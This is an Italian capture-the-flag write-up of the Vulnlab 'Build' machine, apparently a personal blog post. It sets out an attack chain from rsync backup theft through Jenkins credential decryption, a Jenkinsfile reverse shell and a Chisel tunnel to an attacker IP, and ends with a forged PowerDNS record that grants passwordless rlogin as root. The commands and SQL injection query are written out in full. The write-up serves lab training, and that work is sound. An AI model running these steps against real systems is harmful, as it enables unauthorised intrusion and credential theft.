+++
date = '2026-05-26T17:05:54+02:00'
draft = false
title = 'Build Writeup IT'
+++
**Nome**: `joy.scd01`

**Data**: `23/06/2025`

![build_slide.png](/images/imgs_build/build_slide.png)

---
# Introduzione

_Build_ è una macchina Linux di livello _Easy_, che copre argomenti come **data exfiltration, Jenkins exploitation, port forwarding e privilege escalation tramite manipolazione di PowerDNS**.

Grazie a un modulo di **backup accessibile pubblicamente via `rsync`**, ho ottenuto la configurazione completa di Jenkins, all’interno della quale era presente una password cifrata. Dopo averla decriptata, sono riuscito ad accedere al servizio **Gitea** esposto sulla macchina.
All’interno di Gitea era presente una repository contenente un **Jenkinsfile**, legato a un job già configurato. Modificando la pipeline ho ottenuto l’**accesso iniziale** alla macchina.

Da lì, ho scoperto che all'interno del file `.rhosts`, nella home di root, era presente un hostname interno (`admin.build.vl`).
Tramite **port forwarding con Chisel** e **manipolazione del database PowerDNS**, ho creato un record DNS fittizio che risolveva `admin.build.vl` verso il mio IP.
Questa modifica mi ha permesso di **bypassare il meccanismo di trust basato su hostname**, e ottenere accesso **come root** tramite `rlogin`, **senza l’uso di credenziali**.

---
# Tecniche utilizzate

-  **Data exfiltration & Password Cracking**
-  **Jenkins RCE via Pipeline Modification**
-  **Chisel tunneling**
-  **Host-Based Trust Abuse via database record injection**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- build
```

![nmap1.png](/images/imgs_build/nmap1.png)

Scansione mirata con script e servizi:

```bash
nmap -sC -sV build
```

![nmap-services.png](/images/imgs_build/nmap-services.png)

**Servizi rilevati**:
-  **22/tcp** - ssh
-  **53/tcp** - PowerDNS
-  **512/tcp** - netkit-rsh rexecd
-  **513/tcp** - login?
-  **514/tcp** - Netkit rshd
-  **873/tcp** - rsync
-  **3000/tcp**  - ppp
-  **3306/tcp** - mysql
-  **8081/tcp** - blackice-icecap

## Web - Gitea (porta 3000)

Il servizio hostato sulla **porta 3000** espone un'interfaccia di **Gitea**.
Analizzandola ho trovato un utente: **`buildadm`** e una repository pubblica **`buildadm/dev`**. Al cui interno è presente un file chiamato **`Jenkinsfile`**, contenente una Jenkins pipeline, che in prima analisi non fa nulla.

![jenkinsfile.png](/images/imgs_build/jenkinsfile.png)

A questo punto ho cercato su Google qualche informazione in più sulle "Jenkins pipeline" e ho trovato questo articolo che spiega come poter ottenere Remote Code Execution sfruttandole.

Risorsa: https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html

Un ottimo vettore di attacco, ma non potendo modificare il file presente nella repository, ho continuato con l'enumerazione dei vari servizi.

## r-Services (porte 512 - 513 - 514)

Innanzitutto sono andato ad informarmi riguardo le porte **512, 513, 514**.

Risorsa: https://www.computerworld.com/article/1391548/r-services.html

Sono associate ai cosiddetti **r-services** (come **rsh, rlogin, rexec**), che sono vecchi protocolli legacy di accesso remoto, basati su **hostname trust** tramite `.rhosts`.

**_Premetto che questa fase di Enumerazione/Ricerca di informazioni si è rivelata cruciale per la fase di Privilege Escalation_.**

## Rsync (porta 873)

Il protocollo **rsync**, esponeva un modulo pubblico chiamato `backups`, che ho subito scaricato.

```bash
rsync build::
```

```bash
rsync -avz build::backups backups
```

All'interno era presente uno strano archivio `jenkins.tar.gz`.

_Strano perchè non sembra essere realmente compresso con gzip, nonostante la sua estensione._

Comunque, lo si può decomprimere con:

```bash
tar -xvf jenkins.tar.gz
```

L'archivio contiene la configurazione di _Jenkins_, compresi i file:
-  **`jobs/build/config.xml`**
-  **`secrets/hudson.util.Secret`**
-  **`secret/master.key`**

Che sono serviti per ottenere un primo accesso alla piattaforma Gitea, tramite la quale ho ottenuto il foothold sulla macchina.

---
# Accesso Iniziale – Rsync Exposure → Jenkins Creds → Gitea → Jenkins RCE

Nel file **`jobs/build/config.xml`** erano presenti delle credenziali tra cui una password cifrata:

![config.xml.png](/images/imgs_build/config.xml.png)

A questo punto mi è bastato cercare letteralmente su Google "_Come craccare credenziali jenkins_" per trovare questa repo:

Risorsa: https://github.com/hoto/jenkins-credentials-decryptor

Che, oltre ad offrire uno strumento per tale decriptazione, spiega anche come Jenkins cifra le credenziali.

In poche parole, Jenkins utilizza la **`master.key`** per derivare un'altra chiave che viene memorizzata nel file **`hudson.util.Secret`**. Quest'ultima viene utilizzata, insieme a un determinato algoritmo, per criptare le credenziali che vengono poi salvate all'interno del file **`config.xml`**.

**Nota**: _Anche se la repository citata spiega bene il funzionamento della cifratura in Jenkins, non ho utilizzato lo script in essa contenuto._

Essendo in possesso di tutti e 3 sono riuscito a craccare la password utilizzando questo script Python:

Risorsa: https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py

```bash
python3 j-decrypter.py jenkins_configuration/secrets/master.key jenkins_configuration/
secrets/hudson.util.Secret jenkins_configuration/jobs/build/config.xml
```

![decrypted.png](/images/imgs_build/decrypted.png)

Ho testato le credenziali via SSH, senza successo.

Così sono ritornato sulla pagina Gitea e mi sono loggato.
Ora avevo ben chiaro in mente cosa fare per poter ottenere l'accesso iniziale.

Seguendo ciò che riportava l'articolo, precedentemente trovato, sul come sfruttare la pipeline, sono entrato nella repository **`buildadm/dev`** e ho modificato **`Jenkinsfile`** inserendo il codice di una reverse shell in bash:

![changes.png](/images/imgs_build/changes.png)

Mi sono messo in ascolto con **netcat** e, cliccando su _"Commit Changes"_, ho ottenuto la reverse shell.

![initial-access.png](/images/imgs_build/initial-access.png)

Nella home ho trovato la **user flag**.

---
# Privilege Escalation – Chisel tunneling → DNS record injection → rlogin trust abuse

Da qui, come al solito, ho iniziato ad enumerare la macchina internamente.

Nella home dell'utente, oltre alla **user flag** era presente  il file **`.rhosts`**.
Al suo interno, l'hostname:

**`admin.build.vl`**

Questo suggeriva un **meccanismo di trust basato su hostname**, tipico dell’autenticazione tramite `rlogin`, che consente accesso senza password se il client è considerato “trusted”.

Il fatto che `rlogin` fosse tra i servizi enumerati in partenza, mi ha fatto capire di essere sulla strada giusta.

_E qui ritorno al discorso che facevo inizialmente: **se non avessi perso del tempo ad analizzare ed informarmi riguardo i servizi hostati sulle porte 512–514 durante l’enumerazione iniziale, probabilmente non avrei mai realizzato l’importanza di quel `.rhosts`**._

In ogni caso non avevo un'idea precisa di come utilizzarlo.

Quindi sono passato ad analizzare il servizio **mysql** che, come segnalatomi dallo scan di nmap, **era hostato sulla porta 3306**.

Ho provato a raggiungerlo nella speranza di potervi accedere senza credenziali e di trovare qualcosa di utile. Per farlo ho utilizzato **chisel**.

A questo punto però è sorto un altro problema: non sapevo quale fosse l'interfaccia di rete e nessuno dei comandi che conoscevo per enumerarla (`ss -tuln`, `ip a`, `ifconfig`) portava a nulla di concreto.

Così cercando ho trovato un altro metodo: **leggere il file `/proc/net/route`**.
Questo file mostra le rotte di rete in esadecimale.

```bash
cat /proc/net/route
```

![net_route.png](/images/imgs_build/net_route.png)

Quindi, ho copiato il Gateway e ho usato il seguente convertitore online per ricavarne l'IP:

Risorsa: https://www.browserling.com/tools/hex-to-ip

**Nota**:_Questa conversione può essere fatta anche manualmente nel box, con una concatenazione di comandi bash (come mostrato in questo screenshot)_

![docker_net.png](/images/imgs_build/docker_net.png)

_Essendo però un comando complesso trovo che, per una cosa del genere, sia molto più facile e sbrigativo farlo tramite un convertitore online_.

![converted.png](/images/imgs_build/converted.png)

Detto ciò, ho trasferito il binario **chisel** sulla macchina e ho creato il tunnel:

```bash
#attaccante
chisel server -p 8000 --reverse
#vittima
./chisel client 10.8.6.158:8000 R:3306:172.18.0.1:3306
```

![chisel_tunneling.png](/images/imgs_build/chisel_tunneling.png)

Fortunatamente il database consentiva l'autenticazione come root senza richiedere la password.

```bash
mysql -h localhost -P 3306 -u root
```

![mysql.png](/images/imgs_build/mysql.png)

Una volta dentro, ho identificato il database `powerdnsadmin`, e sono andato sul sicuro dumpando i dati dalla tabella **user**.

```sql
SELECT * FROM user;
```

![admin_hash.png](/images/imgs_build/admin_hash.png)

Password hashata per l'utente **admin**.

Password che, da una parte, sono riuscito a craccare facilmente utilizzando hashcat e dall'altra non mi ha portato a nulla.

Qui ho avuto un momento di stallo totale.

Ho riguardato tutti i passi fatti finora e ho ripreso l'enumerazione del database, trovando nella tabella **`records`** tutti i DNS risolti dalla macchina.
A questo punto ho realizzato che la chiave per fare Privilege Escalation consisteva proprio nel manipolare il database in modo da mappare il mio indirizzo IP all'hostname presente nel file **`.rhosts`**.

Per farlo ho creato una **query** basandomi sulla struttura della tabella **`records`** :

```sql
INSERT INTO powerdns.records (domain_id, name, type, content, ttl, prio, disabled, ordername, auth) VALUES ((SELECT id from powerdns.domains WHERE name = 'build.vl'), 'admin.build.vl', 'A', '10.8.6.158', 60, 0, 0, NULL, 1);
```

![query_injection.png](/images/imgs_build/query_injection.png)

A questo punto ho completato la macchina loggandomi come **root** tramite `rlogin`.

```bash
rlogin build -l root
```

![system_proof.png](/images/imgs_build/system_proof.png)

Nella home è presente la **root flag**.

---
# Conclusioni finali

Come al solito, trovo le macchine di Vulnlab dei capolavori.
Fanno sempre scoprire tecniche nuove, tool alternativi e informazioni su scenari potenzialmente ritrovabili nel mondo reale.

La chiave per questo box è comprendere a fondo come è organizzato l’ambiente e quali servizi sono in esecuzione: è proprio dall’analisi dettagliata di questi e delle loro caratteristiche che spesso emergono le soluzioni per fare privilege escalation o ottenere un accesso iniziale.

Nel caso di _Build_, l’attenzione dedicata ai servizi legacy come `rlogin` e alla presenza del file `.rhosts` è stata decisiva per capire come rootare la macchina.
Se non avessi perso del tempo ad analizzare quelle porte durante l’enumerazione iniziale, probabilmente sarei rimasto bloccato molto più a lungo.

Molto interessante anche l'RCE tramite **pipeline injection**, che non mi era mai capitato di sfruttare prima.

**Nonostante a prima vista _Build_ possa sembrare una macchina complessa, si rivela in realtà una box coerente e lineare**, che dimostra perfettamente quanto l’enumerazione e la comprensione dell’ambiente contino più dello sfruttamento "brutale".
Ed è proprio per questo che resta giustamente classificata come _Easy_.

**Fonti**:

-  **Jenkins Pipeline Remote Code Execution** | https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html
-  **Informazioni sulle porte 512-514 (r-services)**  | https://www.computerworld.com/article/1391548/r-services.html
-  **Informazioni sulle credenziali Jenkins** | https://github.com/hoto/jenkins-credentials-decryptor
-  **Script per craccare le credenziali Jenkins** | https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py
-  **Convertitore hex-to-ip** | https://www.browserling.com/tools/hex-to-ip